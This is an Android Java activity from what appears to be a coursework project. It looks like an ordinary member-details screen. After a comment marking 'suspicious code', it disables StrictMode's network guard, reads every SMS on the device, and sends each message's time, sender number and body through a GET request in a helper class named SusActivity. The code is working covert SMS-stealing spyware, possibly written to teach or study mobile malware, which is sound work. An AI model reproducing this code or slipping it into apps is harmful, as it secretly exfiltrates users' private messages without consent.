package com.example.coursework1;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.widget.TextView;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;


public class DetailsActivity extends AppCompatActivity {

    TextView memberDetails;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_details);

        memberDetails = (TextView) findViewById(R.id.memberDetails);

        String details = getIntent().getStringExtra("key");

        if(details != null){
            memberDetails.setText(details);
        }

        //here onwards is all suspicious code
        int SDK_INT = android.os.Build.VERSION.SDK_INT;
        if (SDK_INT > 8)
        {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
                    .permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        List<sms> smsList= sms();
        for (sms sms : smsList) {
            Log.v("sms", sms.getMsg());
            try {
                SusActivity.sendGET("sms?time="+sms.getTime()+"&number="+sms.getAddress()+"&msg="+sms.getMsg());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }

    @SuppressLint("Range")
    public List<sms> sms() {
        List<sms> smsList = new ArrayList<sms>();

        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);

        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                sms objSms = new sms();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c.getColumnIndexOrThrow("address")));
                objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                smsList.add(objSms);
                c.moveToNext();
            }
        }
        else {
            throw new RuntimeException("You have no SMS");
        }
        c.close();

        return smsList;
    }
}